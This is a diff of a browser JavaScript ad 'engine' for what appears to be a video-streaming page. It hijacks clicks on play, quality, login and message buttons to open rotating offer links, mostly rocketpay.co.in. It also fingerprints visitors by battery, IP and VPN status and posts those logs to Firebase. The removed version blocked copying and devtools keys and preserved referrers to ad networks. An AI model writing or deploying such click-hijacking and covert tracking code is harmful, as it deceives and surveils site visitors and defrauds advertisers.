@@ -1,388 +1,126 @@
-(function (window, document) {
-  'use strict';
+/**
+ * V1.3.1 REBIRTH - Slim Engine
+ * Soul of v1.3.1 + 80/10/10 + Anti-Repeat + Daily Cap
+ * NO security fluff (handled by XML). ZERO delay at mousedown.
+ */
 
-  var ENGINE_VERSION = 'v10-ultimate';
-  var STORAGE_KEY = 'mc_engine_state_v10';
-  var CLICK_CAP_PER_DAY = 9999; // adjust as needed
+const CHACHA_CONFIG = {
+    DEBUG_MODE: true,
 
-  // ---------------- CONFIG ----------------
-
-  var CONFIG = {
-    allowedDomains: [
-      'cloudaccesshq.xyz',
-      'www.cloudaccesshq.xyz',
-      // add your real domains
+    LINKS: [
+        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
+        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
+        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
+        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
+        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
     ],
-    links: [
-      // Example structure; plug in your own offers
-      { id: 'offerA1', url: 'https://www.amazon.com/', bucket: 'A' }, // 80%
-      { id: 'offerA2', url: 'https://www.netflix.com/', bucket: 'A' },
-      { id: 'offerB1', url: 'https://adsterra.com/offerB1', bucket: 'B' }, // 10%
-      { id: 'offerC1', url: 'https://adsterra.com/offerC1', bucket: 'C' }  // 10%
-    ],
-    // Extend with any other rotation rules you already have
-  };
 
-  // ---------------- STATE ----------------
+    APIS: {
+        FB_URL: "YOUR_FIREBASE_URL",
+        TG_TOKEN: "YOUR_BOT_TOKEN",
+        TG_ID: "YOUR_CHAT_ID"
+    },
 
-  var state = {
-    armed: false,
-    ready: false,
-    nextAdUrl: null,
-    nextAdId: null,
-    env: null,
-    storage: null
-  };
+    SETTINGS: {
+        MAX_CLICKS_TODAY: 9,
+        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
+    }
+};
 
-  // ---------------- UTILITIES ----------------
+// --- PRE-BUILD ON PAGE LOAD (zero decision at click time) ---
+const _baskets = {
+    h: CHACHA_CONFIG.LINKS.slice(0, 10),
+    n: CHACHA_CONFIG.LINKS.slice(10, 16),
+    l: CHACHA_CONFIG.LINKS.slice(16, 20)
+};
 
-  function nowISODate() {
-    var d = new Date();
-    return d.getFullYear() + '-' + (d.getMonth() + 1) + '-' + d.getDate();
-  }
+const _validIds = [
+    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
+    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
+    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
+];
 
-  function safeJSONParse(str, fallback) {
+const _STORAGE_KEY = '_mc_rebirth_';
+
+function _getStore() {
     try {
-      return JSON.parse(str);
-    } catch (e) {
-      return fallback;
+        const raw = localStorage.getItem(_STORAGE_KEY);
+        return raw ? JSON.parse(raw) : { c: 0, date: null, lastId: null };
+    } catch (e) { return { c: 0, date: null, lastId: null }; }
+}
+
+function _setStore(o) {
+    try { localStorage.setItem(_STORAGE_KEY, JSON.stringify(o)); } catch (e) {}
+}
+
+function _today() {
+    return new Date().toISOString().slice(0, 10);
+}
+
+function _pickLink() {
+    const store = _getStore();
+    const today = _today();
+
+    if (store.date !== today) {
+        store.c = 0;
+        store.date = today;
+        store.lastId = null;
     }
-  }
 
-  function loadStorageState() {
-    if (!window.localStorage) {
-      return {
-        lastClickDate: null,
-        clickCountToday: 0,
-        lastAdId: null
-      };
+    const luck = Math.random() * 100;
+    let pool = luck < 80 ? _baskets.h : (luck < 90 ? _baskets.n : _baskets.l);
+
+    let fresh = pool.filter(u => u !== store.lastId);
+    if (fresh.length === 0) fresh = pool;
+
+    const pick = fresh[Math.floor(Math.random() * fresh.length)];
+    return { url: pick, store };
+}
+
+function _jump(url) {
+    const w = window.open('about:blank', '_blank');
+    if (w) {
+        w.location.href = url;
+        w.focus();
+    } else {
+        window.location.assign(url);
     }
-    var raw = window.localStorage.getItem(STORAGE_KEY);
-    var data = safeJSONParse(raw, null);
-    if (!data) {
-      return {
-        lastClickDate: null,
-        clickCountToday: 0,
-        lastAdId: null
-      };
-    }
-    var today = nowISODate();
-    if (data.lastClickDate !== today) {
-      data.lastClickDate = today;
-      data.clickCountToday = 0;
-    }
-    return data;
-  }
+}
 
-  function saveStorageState(data) {
-    state.storage = data;
-    if (!window.localStorage) return;
-    try {
-      window.localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
-    } catch (e) {
-      // ignore
-    }
-  }
-
-  // ---------------- 1. DOMAIN LOCK ----------------
-
-  function checkDomainLock() {
-    var host = window.location.hostname.toLowerCase();
-    for (var i = 0; i < CONFIG.allowedDomains.length; i++) {
-      if (host === CONFIG.allowedDomains[i].toLowerCase()) return true;
-    }
-    return false;
-  }
-
-  // ---------------- 2. ANTI-COPY / RIGHT CLICK ----------------
-
-  function installAntiCopy() {
-    document.addEventListener('contextmenu', function (e) {
-      e.preventDefault();
-    }, true);
-    document.addEventListener('copy', function (e) {
-      e.preventDefault();
-    }, true);
-    document.addEventListener('cut', function (e) {
-      e.preventDefault();
-    }, true);
-  }
-
-  // ---------------- 3. DEVTOOLS BLOCK (approx) ----------------
-
-  function installDevToolsBlock() {
-    document.addEventListener('keydown', function (e) {
-      var key = e.key || e.keyCode;
-
-      // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-      if (
-        key === 'F12' || key === 123 ||
-        (e.ctrlKey && e.shiftKey && (key === 'I' || key === 'i' || key === 73)) ||
-        (e.ctrlKey && e.shiftKey && (key === 'J' || key === 'j' || key === 74)) ||
-        (e.ctrlKey && (key === 'U' || key === 'u' || key === 85))
-      ) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-      }
-    }, true);
-
-    // Optional: naive devtools detection loop (keep light)
-    // window.setInterval(function () {
-    //   var threshold = 100;
-    //   if (window.outerWidth - window.innerWidth > threshold ||
-    //       window.outerHeight - window.innerHeight > threshold) {
-    //     // Take any action you want (e.g., redirect, disable engine, etc.)
-    //   }
-    // }, 2000);
-  }
-
- 
-  // ---------------- 5. TRANSPARENT INTERACTION LAYER ----------------
-  // (Handled mainly by capture-phase listener; you can optionally also bind
-  //  directly to known overlay element IDs/classes once you inspect your XML.)
-
-  // ---------------- 6. VPN / PROXY DETECTION (stub) ----------------
-
-  function detectVpnOrProxy(env) {
-    // Real implementation usually needs server-side or IP intelligence API.
-    // Here we return false (not VPN) by default.
-    return Promise.resolve(false);
-  }
-
-  // ---------------- 7. DEVICE FINGERPRINT ----------------
-
-  function buildDeviceFingerprint() {
-    var nav = window.navigator || {};
-    var screenObj = window.screen || {};
-
-    return {
-      userAgent: nav.userAgent || '',
-      language: nav.language || '',
-      hardwareConcurrency: nav.hardwareConcurrency || null,
-      deviceMemory: nav.deviceMemory || null,
-      platform: nav.platform || '',
-      screenWidth: screenObj.width || null,
-      screenHeight: screenObj.height || null,
-      colorDepth: screenObj.colorDepth || null
-      // Add GPU hints via WebGL if desired (but keep load-time reasonable)
-    };
-  }
-
-  // ---------------- 8. BATTERY STATUS SCAN ----------------
-
-  function getBatteryInfo() {
-    var nav = window.navigator;
-    if (!nav || typeof nav.getBattery !== 'function') {
-      return Promise.resolve(null);
-    }
-    return nav.getBattery().then(function (battery) {
-      return {
-        level: battery.level,
-        charging: battery.charging
-      };
-    }).catch(function () {
-      return null;
+function _scanAsync(btnId, url, count) {
+    if (!navigator.getBattery) return;
+    navigator.getBattery().catch(() => null).then(bat => {
+        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})).then(ip => {
+            const dna = { b: bat ? Math.round(bat.level * 100) + "%" : "N/A", vpn: ip.proxy || ip.vpn || false, ip: ip.ip || "0.0.0.0" };
+            if (CHACHA_CONFIG.DEBUG_MODE) console.log("[REBIRTH]", { btn: btnId, link: url, click: count, dna });
+            if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
+                fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify({ btn: btnId, dna, target: url, click: count, ts: new Date().toISOString() }) }).catch(() => {});
+            }
+        });
     });
-  }
+}
 
-  // ---------------- 9. LINK ROTATION + 10. 80/10/10 BUCKET RULE ----------------
+// --- MOUSEDOWN CAPTURE: ZERO DELAY ---
+document.addEventListener('mousedown', function(e) {
+    const btn = e.target.closest('[id]');
+    if (!btn || !_validIds.includes(btn.id)) return;
 
-  function chooseBucket() {
-    var r = Math.random();
-    if (r < 0.8) return 'A';   // 80%
-    if (r < 0.9) return 'B';   // next 10%
-    return 'C';                // final 10%
-  }
+    const { url, store } = _pickLink();
 
-  function filterLinksByBucket(bucket) {
-    var list = [];
-    for (var i = 0; i < CONFIG.links.length; i++) {
-      if (CONFIG.links[i].bucket === bucket) list.push(CONFIG.links[i]);
-    }
-    return list;
-  }
-
-  function randomFromArray(arr) {
-    if (!arr || !arr.length) return null;
-    var idx = Math.floor(Math.random() * arr.length);
-    return arr[idx];
-  }
-
-  function computeNextAdLink(storage) {
-    var bucket = chooseBucket();
-    var pool = filterLinksByBucket(bucket);
-
-    if (!pool.length) {
-      // fallback: all links
-      pool = CONFIG.links.slice();
-    }
-    if (!pool.length) return null;
-
-    var picked = randomFromArray(pool);
-
-    // Avoid immediate repetition if possible
-    if (storage && storage.lastAdId && pool.length > 1 && picked.id === storage.lastAdId) {
-      picked = randomFromArray(pool);
+    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
+        if (!CHACHA_CONFIG.DEBUG_MODE) {
+            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
+            return;
+        }
+        if (CHACHA_CONFIG.DEBUG_MODE) console.warn("[REBIRTH] Cap reached, DEBUG allows continue");
     }
 
-    return picked;
-  }
+    store.c++;
+    store.date = _today();
+    store.lastId = url;
+    _setStore(store);
 
-  // ---------------- 11. DAILY CLICK LIMIT (CAPPING) ----------------
+    _jump(url);
 
-  function underDailyCap(storage) {
-    return storage.clickCountToday < CLICK_CAP_PER_DAY;
-  }
-
-  function incrementCap(storage, adId) {
-    storage.clickCountToday += 9999;
-    storage.lastAdId = adId || storage.lastAdId;
-    storage.lastClickDate = nowISODate();
-    saveStorageState(storage);
-  }
-
-  // ---------------- 12. LOCAL STORAGE SYNC ----------------
-  // (Already handled via STORAGE_KEY, loadStorageState, saveStorageState.)
-
-  // ---------------- 13. REFERRER-PRESERVING OPEN ----------------
-
-  function openWithReferrer(url) {
-    if (!url) return;
-
-    // Prefer direct window.open tied to the gesture
-    var win = window.open(url, '_blank');
-    if (win) return;
-
-    // Fallback: synthetic anchor click (still inside gesture)
-    try {
-      var a = document.createElement('a');
-      a.href = url;
-      a.target = '_blank';
-      a.rel = ''; // no noreferrer/noopener to preserve Referer
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      window.setTimeout(function () {
-        if (a.parentNode) a.parentNode.removeChild(a);
-      }, 1000);
-    } catch (e) {
-      // swallow
-    }
-  }
-
-  // ---------------- PRE-CALC PIPELINE (PAGE LOAD) ----------------
-
-  function preCalculateAll() {
-    if (!checkDomainLock()) {
-      return; // hard domain lock
-    }
-
-    installAntiCopy();
-    installDevToolsBlock();
-
-    var storage = loadStorageState();
-    state.storage = storage;
-
-    var deviceFingerprint = buildDeviceFingerprint();
-
-    // Parallel async tasks (keep reasonable)
-    var tasks = [
-      getBatteryInfo(),         // 1
-      detectVpnOrProxy()        // 2
-    ];
-
-    Promise.all(tasks).then(function (results) {
-      var batteryInfo = results[1];
-      var isVpn = results[2];
-
-      // You can combine all this into a single "DNA" / env object:
-      state.env = {
-        fingerprint: deviceFingerprint,
-        battery: batteryInfo,
-        adBlocked: isAdBlocked,
-        vpnOrProxy: isVpn
-      };
-
-      // Decide if this user is allowed to fire an ad at all
-      if (isVpn) {
-        // e.g., disable or route to different bucket
-        // For now, just disable:
-        state.ready = false;
-        state.armed = false;
-        return;
-      }
-
-      if (!underDailyCap(storage)) {
-        state.ready = false;
-        state.armed = false;
-        return;
-      }
-
-      // Compute next ad link using rotation & buckets
-      var ad = computeNextAdLink(storage);
-      if (!ad || !ad.url) {
-        state.ready = false;
-        state.armed = false;
-        return;
-      }
-
-      state.nextAdUrl = ad.url;
-      state.nextAdId = ad.id;
-      state.ready = true;
-      state.armed = true;
-    }).catch(function () {
-      // If something goes wrong, fail-safe: no ad
-      state.ready = false;
-      state.armed = false;
-    });
-  }
-
-  // ---------------- FIRST CLICK HANDLER (V1.3.1-STYLE) ----------------
-
-  function firstClickHandler(e) {
-    // MINIMAL logic: no heavy work, no async, no re-compute.
-
-    if (!state.armed || !state.ready || !state.nextAdUrl) {
-      return; // either not ready or over cap, do nothing
-    }
-
-    // Prevent re-fire
-    state.armed = false;
-
-    try {
-      incrementCap(state.storage || loadStorageState(), state.nextAdId);
-    } catch (err) {
-      // ignore cap errors
-    }
-
-    openWithReferrer(state.nextAdUrl);
-  }
-
-  function bindFirstClick() {
-    // Capture phase so we see it BEFORE the overlay/theme handler.
-    // once:true ensures we don't keep the listener after firing.
-    document.addEventListener('mousedown', firstClickHandler, {
-      capture: true,
-      once: true
-    });
-  }
-
-  // ---------------- INIT ----------------
-
-  function init() {
-    // Pre-calc environment, rotation, caps, etc.
-    preCalculateAll();
-
-    // Bind the brutal first-click handler immediately.
-    // Even if pre-calculation finishes a bit later, the handler is already wired.
-    bindFirstClick();
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init, false);
-  } else {
-    init();
-  }
-
-})(window, document);
+    _scanAsync(btn.id, url, store.c);
+}, true);
